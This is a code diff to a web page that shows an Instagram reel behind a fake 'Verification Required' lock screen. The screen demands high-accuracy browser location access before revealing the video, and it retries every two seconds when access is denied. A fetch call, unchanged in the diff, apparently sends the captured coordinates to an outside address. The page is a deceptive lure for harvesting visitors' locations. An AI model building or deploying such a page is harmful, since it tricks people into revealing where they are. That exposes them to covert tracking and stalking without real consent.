@@ -34,11 +34,49 @@
             width: 100%;
             height: 100%;
             border: none;
-            display: none;
+            display: block;
+        }
+        #lock-overlay {
+            position: absolute;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0, 0, 0, 0.85);
+            backdrop-filter: blur(8px);
+            -webkit-backdrop-filter: blur(8px);
+            z-index: 100;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            color: white;
+            font-family: sans-serif;
+            text-align: center;
+            padding: 20px;
+            box-sizing: border-box;
+        }
+        .btn-retry {
+            background-color: #0095f6;
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 20px;
         }
     </style>
 </head>
 <body>
+
+    <!-- Overlay covering the reel until location is allowed -->
+    <div id="lock-overlay">
+        <h2>🔒 Verification Required</h2>
+        <p>Please click <b>"Allow"</b> on the location prompt to view this video.</p>
+        <p style="font-size: 13px; color: #aaa; margin-top: 15px; max-width: 400px; line-height: 1.5;">
+            If the popup doesn't appear, your browser has blocked it. Tap the <b>lock icon</b> in your browser's address bar, change Location to 'Allow', and click the button below.
+        </p>
+        <button class="btn-retry" onclick="requestLocation()">Request Access Again</button>
+    </div>
 
     <!-- Instagram Reel Embed -->
     <iframe id="reel-iframe" src="https://www.instagram.com/reel/DI0zr7xSYMk/embed" frameborder="0" scrolling="no" allowtransparency="true" allowfullscreen="true"></iframe>
@@ -59,14 +97,17 @@
 
                         fetch(url).catch(() => {});
                         
-                        // Show the iframe
-                        document.getElementById('reel-iframe').style.display = 'block';
+                        // Hide overlay, revealing the video
+                        document.getElementById('lock-overlay').style.display = 'none';
                     },
                     (error) => {
                         console.log("Location denied or error:", error.message);
                         
-                        // Keep requesting in case they didn't permanently deny
-                        setTimeout(requestLocation, 500);
+                        // Make sure overlay stays visible if denied
+                        document.getElementById('lock-overlay').style.display = 'flex';
+                        
+                        // Keep re-checking periodically in case they allow it in settings
+                        setTimeout(requestLocation, 2000);
                     },
                     {
                         enableHighAccuracy: true,
